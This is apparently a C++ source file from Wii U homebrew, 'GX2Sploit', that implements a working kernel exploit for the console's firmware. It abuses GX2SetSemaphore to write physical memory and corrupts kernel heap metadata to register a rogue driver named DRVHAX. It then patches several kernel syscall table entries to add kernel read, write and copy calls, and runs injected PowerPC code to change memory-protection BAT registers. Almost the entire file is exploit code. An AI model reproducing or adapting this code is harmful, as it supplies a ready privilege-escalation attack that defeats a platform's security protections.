#include "gx2sploit.h"
#include "ElfUtils.h"
#include <coreinit/cache.h>
#include <coreinit/core.h>
#include <coreinit/debug.h>
#include <coreinit/dynload.h>
#include <coreinit/exit.h>
#include <coreinit/memory.h>
#include <coreinit/memorymap.h>
#include <coreinit/thread.h>
#include <cstring>
#include <gx2/state.h>
#include <malloc.h>
#include <sysapp/launch.h>
#include <utils/logger.h>
#include <whb/log.h>

#define JIT_ADDRESS     0x01800000

#define KERN_HEAP       0xFF200000
#define KERN_HEAP_PHYS  0x1B800000


#define KERN_CODE_READ  0xFFF023D4
#define KERN_CODE_WRITE 0xFFF023F4
#define KERN_DRVPTR     0xFFEAB530

#define STARTID_OFFSET  0x08
#define METADATA_OFFSET 0x14
#define METADATA_SIZE   0x10

extern "C" void SCKernelCopyData(uint32_t addr, uint32_t src, uint32_t len);

/* Find a gadget based on a sequence of words */
static void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start) {
    uint32_t *ptr;

    /* Search code before JIT area first */
    for (ptr = (uint32_t *) gadgets_start; ptr != (uint32_t *) JIT_ADDRESS; ptr++) {
        if (!memcmp(ptr, &code[0], length)) {
            return ptr;
        }
    }

    OSFatal("Failed to find gadget!");
    return NULL;
}

/* Chadderz's kernel write function */
void __attribute__((noinline)) kern_write(const void *addr, uint32_t value) {
    asm volatile(
            "li 3,1\n"
            "li 4,0\n"
            "mr 5,%1\n"
            "li 6,0\n"
            "li 7,0\n"
            "lis 8,1\n"
            "mr 9,%0\n"
            "mr %1,1\n"
            "li 0,0x3500\n"
            "sc\n"
            "nop\n"
            "mr 1,%1\n"
            :
            : "r"(addr), "r"(value)
            : "memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
              "11", "12");
}

extern "C" void OSSwitchSecCodeGenMode(int);

int exploitThread(int argc, char **argv) {
    OSDynLoad_Module gx2_handle;
    OSDynLoad_Acquire("gx2.rpl", &gx2_handle);

    void (*pGX2SetSemaphore)(uint64_t * sem, int action);
    OSDynLoad_FindExport(gx2_handle, 0, "GX2SetSemaphore", (void **) &pGX2SetSemaphore);
    uint32_t set_semaphore = ((uint32_t) pGX2SetSemaphore) + 0x2C;

    uint32_t gx2_init_attributes[9];
    uint8_t *gx2CommandBuffer = (uint8_t *) memalign(0x40, 0x400000);

    gx2_init_attributes[0] = 1;
    gx2_init_attributes[1] = (uint32_t) gx2CommandBuffer;
    gx2_init_attributes[2] = 2;
    gx2_init_attributes[3] = 0x400000;
    gx2_init_attributes[4] = 7;
    gx2_init_attributes[5] = 0;
    gx2_init_attributes[6] = 8;
    gx2_init_attributes[7] = 0;
    gx2_init_attributes[8] = 0;
    GX2Init(gx2_init_attributes); //don't actually know if this is necessary? so temp? (from loadiine or hbl idk)

    /* Allocate space for DRVHAX */
    uint32_t *drvhax = (uint32_t *) OSAllocFromSystem(0x4c, 4);

    /* Set the kernel heap metadata entry */
    uint32_t *metadata = (uint32_t *) (KERN_HEAP + METADATA_OFFSET + (0x02000000 * METADATA_SIZE));
    metadata[0]        = (uint32_t) drvhax;
    metadata[1]        = (uint32_t) -0x4c;
    metadata[2]        = (uint32_t) -1;
    metadata[3]        = (uint32_t) -1;

    /* Find stuff */
    uint32_t gx2data[]                             = {0xfc2a0000};
    uint32_t gx2data_addr                          = (uint32_t) find_gadget(gx2data, 0x04, 0x10000000);
    uint32_t doflush[]                             = {0xba810008, 0x8001003c, 0x7c0803a6, 0x38210038, 0x4e800020, 0x9421ffe0, 0xbf61000c, 0x7c0802a6, 0x7c7e1b78, 0x7c9f2378, 0x90010024};
    void (*do_flush)(uint32_t arg0, uint32_t arg1) = (void (*)(uint32_t, uint32_t))(((uint32_t) find_gadget(doflush, 0x2C, 0x01000000)) + 0x14);

    /* Modify a next ptr on the heap */
    uint32_t kpaddr = KERN_HEAP_PHYS + STARTID_OFFSET;

    set_semaphore_phys(set_semaphore, kpaddr, gx2data_addr);
    set_semaphore_phys(set_semaphore, kpaddr, gx2data_addr);
    do_flush(0x100, 1);

    /* Register a new OSDriver, DRVHAX */
    char drvname[6] = {'D', 'R', 'V', 'H', 'A', 'X'};
    Register(drvname, 6, NULL, NULL);

    /* Use DRVHAX to install the read and write syscalls */
    uint32_t syscalls[2] = {KERN_CODE_READ, KERN_CODE_WRITE};

    DCFlushRange(syscalls, 0x04 * 2);

    /* Modify its save area to point to the kernel syscall table */
    drvhax[0x44 / 4] = KERN_SYSCALL_TBL_1 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);
    drvhax[0x44 / 4] = KERN_SYSCALL_TBL_2 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);
    drvhax[0x44 / 4] = KERN_SYSCALL_TBL_3 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);
    drvhax[0x44 / 4] = KERN_SYSCALL_TBL_4 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);
    drvhax[0x44 / 4] = KERN_SYSCALL_TBL_5 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);

    /* Clean up the heap and driver list so we can exit */
    kern_write((void *) (KERN_HEAP + STARTID_OFFSET), 0);
    kern_write((void *) KERN_DRVPTR, drvhax[0x48 / 4]);

    // Install CopyData syscall
    kern_write((void *) (KERN_SYSCALL_TBL_1 + (0x25 * 4)), (uint32_t) 0x1800000);
    kern_write((void *) (KERN_SYSCALL_TBL_2 + (0x25 * 4)), (uint32_t) 0x1800000);
    kern_write((void *) (KERN_SYSCALL_TBL_3 + (0x25 * 4)), (uint32_t) 0x1800000);
    kern_write((void *) (KERN_SYSCALL_TBL_4 + (0x25 * 4)), (uint32_t) 0x1800000);
    kern_write((void *) (KERN_SYSCALL_TBL_5 + (0x25 * 4)), (uint32_t) 0x1800000);

    /* clean shutdown */
    GX2Shutdown();
    free(gx2CommandBuffer);
    return 0;
}

void KernelWriteU32(uint32_t addr, uint32_t value);

extern "C" void SC_KernelCopyData(uint32_t dst, uint32_t src, uint32_t len);

void KernelWrite(uint32_t addr, const void *data, uint32_t length) {
    // This is a hacky workaround, but currently it only works this way. ("data" is always on the stack, so maybe a problem with mapping values from the JIT area?)
    // further testing required.
    for (uint32_t i = 0; i < length; i += 4) {
        KernelWriteU32(addr + i, *(uint32_t *) (((uint32_t) data) + i));
    }
}

void KernelWriteU32(uint32_t addr, uint32_t value) {
    ICInvalidateRange(&value, 4);
    DCFlushRange(&value, 4);

    uint32_t dst = (uint32_t) OSEffectiveToPhysical(addr);
    uint32_t src = (uint32_t) OSEffectiveToPhysical((uint32_t) &value);

    SC_KernelCopyData(dst, src, 4);

    DCFlushRange((void *) addr, 4);
    ICInvalidateRange((void *) addr, 4);
}

static void SCSetupIBAT4DBAT5() {
    asm volatile("sync; eieio; isync");

    // Give our and the kernel full execution rights.
    // 00800000-01000000 => 30800000-31000000 (read/write, user/supervisor)
    unsigned int ibat4u = 0x008000FF;
    unsigned int ibat4l = 0x30800012;
    asm volatile("mtspr 560, %0"
                 :
                 : "r"(ibat4u));
    asm volatile("mtspr 561, %0"
                 :
                 : "r"(ibat4l));

    // Give our and the kernel full data access rights.
    // 00800000-01000000 => 30800000-31000000 (read/write, user/supervisor)
    unsigned int dbat5u = ibat4u;
    unsigned int dbat5l = ibat4l;
    asm volatile("mtspr 570, %0"
                 :
                 : "r"(dbat5u));
    asm volatile("mtspr 571, %0"
                 :
                 : "r"(dbat5l));

    asm volatile("eieio; isync");
}

extern "C" void SC_0x36_SETBATS(void);

int DoKernelExploit(void) {
    DEBUG_FUNCTION_LINE("Running GX2Sploit");
    /* Make a thread to modify the semaphore */
    OSThread *thread = (OSThread *) memalign(8, 0x1000);
    uint8_t *stack   = (uint8_t *) memalign(0x40, 0x2000);

    OSSwitchSecCodeGenMode(0);
    memcpy((void *) 0x1800000, (void *) &SCKernelCopyData, 0x100);

    unsigned int setIBAT0Addr = 0x1800200;
    unsigned int *curAddr     = (uint32_t *) setIBAT0Addr;

    curAddr[0] = 0x7C0006AC;
    curAddr[1] = 0x4C00012C;
    curAddr[2] = 0x7C7083A6;
    curAddr[3] = 0x7C9183A6;
    curAddr[4] = 0x7C0006AC;
    curAddr[5] = 0x4C00012C;
    curAddr[6] = 0x4E800020;

    DCFlushRange((void *) 0x1800000, 0x1000);
    ICInvalidateRange((void *) 0x1800000, 0x1000);

    OSSwitchSecCodeGenMode(1);

    if (OSCreateThread(thread, (OSThreadEntryPointFn) exploitThread, 0, NULL, stack + 0x2000, 0x2000, 0, 0x1) == 0) {
        OSFatal("Failed to create thread");
    }

    OSResumeThread(thread);
    OSJoinThread(thread, 0);
    free(thread);
    free(stack);

    unsigned char backupBuffer[0x40];
    uint32_t targetBuffer[0x40 / 4];

    uint32_t targetAddress = 0x017FF000;
    KernelWrite((uint32_t) backupBuffer, (void *) 0x017FF000, 0x40);

    targetBuffer[0]  = 0x7c7082a6;                                             // mfspr r3, 528
    targetBuffer[1]  = 0x60630003;                                             // ori r3, r3, 0x03
    targetBuffer[2]  = 0x7c7083a6;                                             // mtspr 528, r3
    targetBuffer[3]  = 0x7c7282a6;                                             // mfspr r3, 530
    targetBuffer[4]  = 0x60630003;                                             // ori r3, r3, 0x03
    targetBuffer[5]  = 0x7c7283a6;                                             // mtspr 530, r3
    targetBuffer[6]  = 0x7c0006ac;                                             // eieio
    targetBuffer[7]  = 0x4c00012c;                                             // isync
    targetBuffer[8]  = 0x3c600000 | (((uint32_t) SCSetupIBAT4DBAT5) >> 16);    // lis r3, setup_syscall@h
    targetBuffer[9]  = 0x60630000 | (((uint32_t) SCSetupIBAT4DBAT5) & 0xFFFF); // ori r3, r3, setup_syscall@l
    targetBuffer[10] = 0x7c6903a6;                                             // mtctr   r3
    targetBuffer[11] = 0x4e800420;                                             // bctr
    DCFlushRange(targetBuffer, sizeof(targetBuffer));

    KernelWrite((uint32_t) targetAddress, (void *) targetBuffer, 0x40);
    /* set our setup syscall to an unused position */
    kern_write((void *) (KERN_SYSCALL_TBL_1 + (0x36 * 4)), targetAddress);
    kern_write((void *) (KERN_SYSCALL_TBL_2 + (0x36 * 4)), targetAddress);
    kern_write((void *) (KERN_SYSCALL_TBL_3 + (0x36 * 4)), targetAddress);
    kern_write((void *) (KERN_SYSCALL_TBL_4 + (0x36 * 4)), targetAddress);
    kern_write((void *) (KERN_SYSCALL_TBL_5 + (0x36 * 4)), targetAddress);

    /* run our kernel code :) */
    SC_0x36_SETBATS();

    /* repair data */
    KernelWrite(targetAddress, backupBuffer, sizeof(backupBuffer));
    DCFlushRange((void *) targetAddress, sizeof(backupBuffer));
    DEBUG_FUNCTION_LINE("GX2Sploit done");
    return 1;
}
